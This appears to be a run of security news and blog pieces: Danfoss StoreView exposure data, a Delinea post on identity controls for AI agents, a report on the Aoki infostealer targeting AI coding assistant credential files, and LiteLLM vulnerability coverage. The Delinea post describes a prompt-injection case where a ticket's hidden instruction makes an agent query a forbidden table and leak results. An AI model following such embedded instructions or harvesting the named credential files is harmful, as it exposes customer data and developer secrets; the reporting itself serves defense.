Censys researchers noted that their telemetry showed that operators of Danfoss StoreView instances don’t appear to be patching their controllers, but “simply taking them off the internet.”

“Patching would have left a mark in the data: the share on 4.3.1 or later (the releases that fix all three CVEs) would have grown,” they explained.

Instead, all three StoreView categories observed – instances below version 4.2, vulnerable to all three vulnerabilities disclosed by Danfoss in 2025; instances in version 4.2.4, vulnerable to CVE-2025-41451 and CVE-2025-41452; and instances in patched versions – shrank by roughly the same amount, about 70%.

“Frankly, this is probably the best choice; there is no reason these should be directly connected to the Internet,” Censys researchers stressed.

In addition, the researchers observed that, while the latest Danfoss StoreView version is 5.3.2, most Danfoss controllers that can be found with a Censys scan worldwide still run unpatched versions of StoreView (older than 4.2).

For instance, while France had 74% of its internet-exposed StoreView instances running below the patched version (4.3.1) on October 11, Poland, Romania and Belgium had even a bigger share (81%, 80% and 76%, respectively).

Meanwhile, the Netherlands was still running 62 internet-exposed, unpatched StoreView instances on the same day, and the US, 58.

Can Security Controls Keep Up With Fast-Moving AI?

Delinea Blog > Can security controls keep up with fast-moving AI?

Can security controls keep up with fast-moving AI?

Why identity controls break for AI agents, and how to fix three gaps: attribute every action to the person who launched the agent, replace standing access with just-in-time access and enforce policy in front of key systems.

Consider a common scenario. A platform engineer builds an agent to sort support tickets. The agent reads the ticket queue, looks up customer accounts in the production database and posts summaries in Slack. The engineer connects the agent with an API token from the engineer's own account, because the token already works and the agent can't complete an MFA prompt. The security team approves access once, at setup.

A year later, the engineer has moved to another team. The agent still runs under the engineer's identity with its day-one permissions, and nobody has reviewed its scope. Then a ticket arrives with an instruction buried in the text. The agent follows the instruction, queries a table it was never meant to touch and posts the results back into the ticket. Every log entry points to the engineer, who hasn't worked on the project in months.

Nobody in that scenario was careless. The agent arrived faster than the controls built to govern it could respond. By the time anyone noticed a problem, the agent had been in production for a year, reading tickets, querying customer records and acting under a person's identity.

Agents add to an identity problem that was already growing. Industry estimates of how far non-human identities (NHIs) outnumber people nearly doubled in one year, from 46:1, to 82:1, according to the Delinea 2026 Identity Security Report. In the same report, 46% of organizations admit their identity governance around AI systems is deficient. The question for security leaders isn't whether agents need new controls. The question is which existing controls still hold, and where agents break them.

What still works: Access security fundamentals haven’t changed

The core principles of access security apply to agents the same way they apply to people: least privilege, defined scope, monitoring and approval before access is granted.

An agent with a narrow, documented scope, a named owner and logged actions is a manageable risk, the same as a contractor

Vaulting, least privilege, session recording and approval gates all still work.

What doesn’t hold is what those controls take for granted. Most controls were built around a human pace: a person requests access, someone approves it and a review checks access months later.

An agent is asking for access constantly, so the approval ends up happening once at setup, and then nobody checks it again until the next review. By then the agent has been running for months and has taken thousands of actions no one has reviewed. The support-ticket agent ran for a full year that way.

The controls also count on whatever you provisioned behaving the same way tomorrow as it did today. That assumption holds for service accounts, but not for agents. The same agent with the same permissions will do different things depending on what it reads and who it’s talking to, so the action you approved on Monday might mean something different by Friday. The support-ticket agent behaved as designed for a year, until one ticket changed what the agent did.

Gap 1: Identity controls assume a human is making the decision

Identity and access management (IAM) and multi-factor authentication (MFA) were built around a person: someone logs in, a prompt shows up on their phone, the person decides whether to approve the login. The model depends on a person reading the prompt and making that decision.

Agents behave differently from both people and services accounts, which puts them in their own identity class. An agent can’t complete an MFA prompt, and the developer building the agent usually has a session or an API token that already works, so the agent runs on that token. From then on, every system the agent touches and every action it takes gets recorded under the developer’s identity, with nothing to show that an agent was involved.

Often inherited from developer

The gap surfaces when someone needs answers. An auditor asks who approved the agent’s access to this application, and often nobody can say, because the access was approved for a person and the agent just inherited it. An incident responder finds a command that ran under an employee’s account and can't tell whether the employee or an agent ran the command. In the support-ticket scenario, the responder finds a query against the customer database under the engineer's account, a year after the engineer left the project.

In the 2026 Identity Security Report, 80% of organizations said they can't always understand why an NHI took a privileged action. That number is for service accounts and agents combined.

Tie each agent to the person who launched it.

Grant only the access the task needs.

Maintain attribution. Every logged action should show both the agent that took it and the person it acted for.

Gap 2: Access is granted once and rarely reviewed

When an agent is set up, it needs OAuth or API scopes to do its job. Usually those scopes get granted broadly, because nobody knows yet exactly what the agent will need, and granting more access up from is easier than coming back for more. Nobody treats the agent as an account that needs review, so it never enters a review cycle. A year later, the agent still holds its day-one permissions. A person with that much access would have been through several access reviews by then.

Standing privilege is risky for any identity, and the risk is higher for agents. An agent acts on what it reads, so a stray instruction in a ticket or an email can trigger it to use any access it already has. The agent is working as designed. It has no reliable way to tell an instruction it should follow from one it shouldn’t. One instruction hidden in a ticket was enough for the support-ticket agent to query a table it was never meant to touch.

Agents move at machine speed. The gap between something going wrong and the damage being done is usually shorter than anyone’s ability to notice.

Many organizations still depend on standing access. In the 2026 Identity Security Report, 59% said they lack a viable alternative to standing access for NHIs and AI agents. Organizations were more than twice as likely to rely on long-lived credentials (35%) as on just-in-time (JIT) access (17%).

Remove standing access where the risk is highest.

Grant just-in-time access per task, scoped to what the task needs.

End access automatically when the task is done.

Keep credentials out of the agent’s hands where possible.

Enforce continuous authorization. Place a policy gateway between the agent and the systems an agent reaches, so the gateway evaluates each request against a policy in real time.

Where possible, the credential should stay out of the agent's hands entirely, so the agent has nothing to hold or leak.

Access has to be granted automatically, at the moment the agent needs it, because a process that needs a person to step in each time won't keep pace with an agent. JIT access controls when the agent gets in. Under a continuous authorization model, the gateway then evaluates each request the agent makes against policy and denies the requests outside the scope of the task.

Gap 3: Control can’t wait for discovery

Most organizations can't see all the agents running in their environment. In the 2026 Identity Security Report, more than half of organizations said they regularly find unsanctioned AI tools or agents in their environment, and only 28% said they can detect that activity in real time.

Agents slip past discovery in two ways. Some agents are gone before anything looks for them, because an agent can spin up, act and disappear in minutes, while most organizations take hours or days to detect unsanctioned AI, according to the 2026 Identity Security Report. Other agents run for months and still never appear, because nothing about them was registered. They have no installer, no license record and no product name for a discovery tool to find.

Confidence runs ahead of that reality. In the same report, 82% of organizations said they are confident they can discover NHIs with access to production systems, but only 30% said they validate NHI and agent activity in real time.

A complete inventory would not solve the problem either. Agents appear and disappear daily, so an inventory is out of date the moment it is finished. An inventory also shows which agents exist, not what each agent can reach right now.

Multi-agent systems make the picture harder to trace. Each additional agent adds access paths and handoffs, and when something breaks, tracing the failure back to the agent or step that caused it takes longer with each layer. Long-lived API tokens passed between agents and servers add risk at each hop, whether the connection runs over Model Context Protocol (MCP) or another protocol.

Start with the systems that can do the most damage: production database, customer records, deployment pipeline.

Put a policy gateway in front of those systems.

Let gating reveal which agents are trying to reach them.

Keep discovery running in parallel, expanding control as it finds more.

A lot of the conversation about rogue agents comes down to the emergency shutoff. People want to know who owns it, whether a kill switch at 2 a.m. is already too late and what happens when an agent is holding live credentials at the moment something goes wrong. In most cases, 2 a.m. is too late, because an agent moving at machine speed has usually finished the damage before anyone reaches the switch. In the support-ticket scenario, a kill switch would've stopped the agent only after the results were already posted in the ticket.

Security teams end up asking those questions when the controls upstream didn’t keep up. An agent with no standing credentials, a clear record of whose authority it acted under, and a full log of its actions rarely creates a 2 a.m. emergency.

A common objection is that this slows AI down. In the 2026 Identity Security Report, 90% of organizations said they’re under pressure to loosen access controls to support AI automation. Loosening controls isn't the only path to speed. When controls are already in place, each new agent goes through a process that already exists, instead of starting a new security debate.

Can security controls keep up with fast-moving AI?

The fundamentals can. Least privilege, scoped access and approval still apply to agents. What has to change is when security teams enforce those controls. Under those controls, the support-ticket agent would run under its own identity, linked to the engineer who launched the agent. The agent would receive read access to the ticket queue for each task, and a policy gateway would deny the request for a table outside that task.

Attribution has to follow each agent back to the person who launched it. Access has to be granted per task, not once at setup. Enforcement has to sit in front of the systems that matter, whether or not discovery has found the agent making the request. Controls enforced at the moment of the request can keep pace with an agent. Controls enforced only at setup leave security teams responding after the damage is done.

New Aoki Infostealer Targets AI Coding Assistant Credentials

Deputy Editor, Infosecurity Magazine

New versions of the Aoki infostealer are targeting credential and session files used by popular AI coding assistants, a new report by Symantec has warned.

This represents a significant development from to earlier versions of Aoki, which focused on browser, cryptocurrency wallet and password manager data, and did not target AI-related files.

Now, the stealer is also able to access API keys and tokens from a number of AI coding assistants, including Anthropic’s Claude, OpenAI's Codex, SpaceX’s Cursor and Google’s Gemini.

The Symantec researchers said that this information can allow a threat actor to carry out malicious activity under a legitimate developer's identity and API quota, bypassing safeguards that assume requests originate from a trusted user.

In addition, the tokens can expose connected repositories, cloud services and continuous integration and continuous delivery (CI/CD) pipelines linked to that account.

Aoki Targets ChatGPT, Claude and GitHub Copilot Credentials

The report, published on October 15, noted that Aoki is a relatively new and sparsely documented infostealer, first observed earlier in 2026.

The ability to steal AI-related files is recent and appears to be expanding, the researchers noted. The newest version of the stealer found by the Symantec’s Threat Hunter Team targeted .claude.json, Claude desktop cookies, ChatGPT cookies, and the Codex config.toml and .env files.

In addition, it stole tokens for GitHub Copilot, Cursor, Gemini, JetBrains AI Assistant and Kiro, along with Amazon Web Services (AWS) credentials.

“Aoki is a highly capable and multi-functional infostealer whose capabilities still appear to be in active development,” Symantec added.

AI Credentials Increasingly Valuable to Hackers

The researchers said Aoki’s development suggests that AI credentials are now considered just as valuable as payment card data and cryptocurrency wallets by threat actors.

“Like card data, a stolen AI key can be cashed in directly, either through resale or by running up usage on the victim's account, a practice sometimes called LLMjacking. Unlike card data, it can also give an attacker a route into the developer's wider environment,” they explained.

Symantec emphasized that it does not know which threat group may be behind the Aoki infostealer and there are no indications it has links to any existing malware family.

However, the rest of the stealer’s target list, which includes a focus on cryptocurrency related wallets and extensions, indicates that the attackers are financially-motivated.

Warning Over High-Risk Vulnerabilities in Widely Used LLM Gateway Tool

Contributing Writer, Infosecurity Magazine

High-risk cybersecurity vulnerabilities have been uncovered in a widely deployed large language model (LLM) gateway tool used by organizations to connect their AI applications to AI software providers including OpenAI, Google and Anthropic.

With almost 100,000 downloads a month, LiteLLM is an open-source tool widely used across enterprises to aid with the building of AI applications and services.

The two vulnerabilities, tracked as CVE-2026-35029 and CVE-2026-59823, could allow any user to gain administrative access to the LLM gateway.

According to cybersecurity researchers at Check Point, this could potentially allow an attacker to perform a full system takeover, providing them with file access, the ability to steal login credentials and even the powers to remotely execute code.

The findings were detailed in a blog post published on October 13, and the vulnerabilities affect versions of LiteLLM that are older than version 1.83.9.

LLM gateways are systems that sit between an application and one or more LLM providers. Instead of calling model APIs directly, applications route requests through a gateway, which then forwards those requests to the appropriate model backend.

Exploits Allow Full System Takeover

Importantly, LLM gateways are often used to centralize management of activities such as credential management, logging and usage tracking. That means the gateways are responsible for storing API keys for every AI provider the organization uses, as well as managing user access through roles and permissions.

By combining this level of access with the CVE-2026-35029 vulnerability, an attacker could exploit a missing authorization check to modify a runtime configuration, potentially allowing full system takeover and remote code execution via malicious Python modules loaded from cloud storage.

Meanwhile, the vulnerability tracked as CVE-2026-59823 could allow an attacker to exploit server-side request forgery to redirect the gateway’s outbound requests, exposing AI provider API keys.

“In practical terms, anyone holding an account on a vulnerable LiteLLM deployment could take over the gateway and use it for malicious purposes,” said Mateo Rojas-Carulla, head of research for AI agent security at Check Point.

Check Point reported both vulnerabilities to LiteLLM through the coordinated disclosure process and LiteLLM version 1.83.9, and all later versions include the fixes to close off the vulnerabilities. Users have been urged to make sure their version of LiteLLM is up to date.

“These findings are familiar application security failures. A missing permission check allowed low-privileged users to reach administrative functions with consequences including code execution,” said Christopher Jess, senior R&D manager at Black Duck, an application security company.

“Centralizing AI access makes such gateways a particularly valuable target which should be secured accordingly. This is another example of the worrying trend of security fundamentals being treated as secondary concerns as adoption of the AI ecosystem accelerates,” he added.

How to Protect Against AI Vulnerability Exploits

In addition to updating to the latest version of LiteLLM, Check Point recommended the companies should apply the following steps to help secure their AI infrastructure:

Review who has access to your gateway. Since any account could be used to exploit these flaws, audit user accounts and remove those that are no longer needed.

Rotate AI provider API keys stored in LiteLLM if there is any indication the gateway was accessed by unauthorized users before patching.

Verify permissions in practice. Confirm that users with limited roles are actually limited, because the gap between configured and enforced permissions is where flaws like CVE-2026-35029 cause the most damage.

Include LLM gateways in security assessments by extending penetration tests and vulnerability assessments to cover AI tooling alongside web applications and cloud infrastructure.
